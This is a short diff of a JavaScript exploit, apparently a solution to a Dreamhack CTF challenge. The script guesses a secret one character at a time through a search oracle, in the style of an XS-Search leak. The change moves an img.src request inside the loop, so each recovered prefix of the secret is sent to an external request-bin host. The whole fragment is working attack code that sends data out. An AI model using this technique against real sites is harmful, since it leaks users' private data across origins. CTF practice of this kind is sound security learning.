@@ -34,11 +34,11 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c
+                    img.src = `https://owtbafv.request.dreamhack.games/${secret}`
                     break;
                 }
             }
         }
-        img.src = `https://owtbafv.request.dreamhack.games/${secret}`
     }
 
     exploit();
